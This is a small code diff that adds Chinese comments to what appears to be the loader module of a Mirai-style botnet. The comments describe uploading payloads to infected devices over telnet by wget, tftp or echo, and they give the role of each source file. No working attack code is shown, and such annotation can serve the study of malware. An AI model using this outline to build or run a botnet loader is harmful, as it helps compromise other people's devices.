@@ -11,7 +11,17 @@
 #include "headers/telnet_info.h"
 #include "headers/binary.h"
 #include "headers/util.h"
-
+// loader模块的代码：
+//  这部分代码的功能就是向感染设备上传（wget、tftp、echo方式）对应架构的payload文件
+/*
+    headers/       头文件目录
+    binary.c       将bins目录下的文件读取到内存中，以echo方式上传payload文件时用到
+    connection.c   判断loader和感染设备telnet交互过程中的状态信息
+    main.c         loader主函数
+    server.c       向感染设备发起telnet交互，上传payload文件
+    telnet_info.c  解析约定格式的telnet信息
+    util.c         一些常用的公共函数
+*/
 static void *stats_thread(void *);
 
 static struct server *srv;
